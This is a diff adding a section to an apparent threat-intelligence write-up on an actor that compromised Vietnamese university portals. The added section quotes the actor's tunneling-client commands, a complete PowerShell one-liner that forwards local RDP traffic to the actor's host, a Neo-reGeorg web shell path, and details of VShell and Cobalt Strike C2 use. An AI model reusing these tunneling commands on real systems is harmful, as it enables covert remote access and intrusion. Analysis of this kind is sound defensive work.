@@ -461,3 +461,38 @@ The above FRP client will connect to the proxy on `103.215.77[.]214:4444` and tu
 
 [![2](/assets/images/china/image1.png)](/assets/images/china/image1.png){: .full}
 
+* Viewing the threat actors IP address on Censys or Shodan, we can see the hostnames of victim machines exposed on ports like 6008 or 6002, which is a result of the FRP setup. 
+
+```
+xlfrc64.exe -k 123 -i 148.66.16[.]226 -p 47009 -s admin123q
+xlfrc64.txt -k 123 -i 148.66.16[.]226 -p 47012 -s admin123q
+```
+
+* Alternative tunneling client (similar to `frpc`) connecting to `148.66.16[.]226` on ports 47009/47012.
+  * We can find a reference to this tool being used for domain-fronting on this [Chinese Security forum](https://cn-sec.com/archives/3430285.html).
+
+```
+powershell -c "$l='0.0.0.0';$p=3389;$r='103.215.77[.]214:6665';$s=New-Object Net.Sockets.TcpListener($l,$p);$s.Start();while($c=$s.AcceptTcpClient()){$s=$c.GetStream();$b=New-Object Byte[] 1024;$d=New-Object Net.Sockets.TcpClient;$d.Connect($r);$u=$d.GetStream();while($i=$s.Read($b,0,$b.Length)){$u.Write($b,0,$i);$u.Flush()};$u.Close();$s.Close()}"
+```
+
+* A custom PowerShell TCP forwarder:
+  * Listens on 0.0.0.0:3389 locally
+  * Forwards traffic to 103.215.77[.]214:6665 (proxying RDP).
+
+`E:\shell\Neo-reGeorg-master\Neo-reGeorg-master\neoreg_servers\tunnel.ashx` - [Open-source Chinese web-shell & tunnel](https://github.com/L-codes/Neo-reGeorg/blob/master/templates/tunnel.ashx)
+
+# VShell
+
+During our investigation, we identified the threat actor leveraging multiple methods for persistent access to target environments. This often included 2 active C2 frameworks (VShell & CS) on a host,  a persistent RDP tunnel, and a webshell. 
+
+Aside from using Cobalt Strike for C2, the adversary has heavily leveraged `VShell` for persistent remote access to compromised Vietnamese university web portals. 
+
+From the file `/vshell/v_windows_amd64/db/data.db` we were able to uncover the full list of the VShell victims. Unlike the CobaltStrike C2, the VShell beacons were reaching straight out to the C2 server, and we were able to recover real victim IP addresses. Additionally, we can see the threat actor had “named” the various victims by their domain name. This made attributing victims incredibly easily. 
+
+Thankfully for us, we were able to access the VShell dashboard for further intelligence:
+
+[![2](/assets/images/china/vshell.png)](/assets/images/china/vshell.png){: .full}
+
+As you can see, by default, the dashboard is in Chinese. All future screenshots have been translated. 
+
+[![2](/assets/images/china/image12.png)](/assets/images/china/image12.png){: .full}
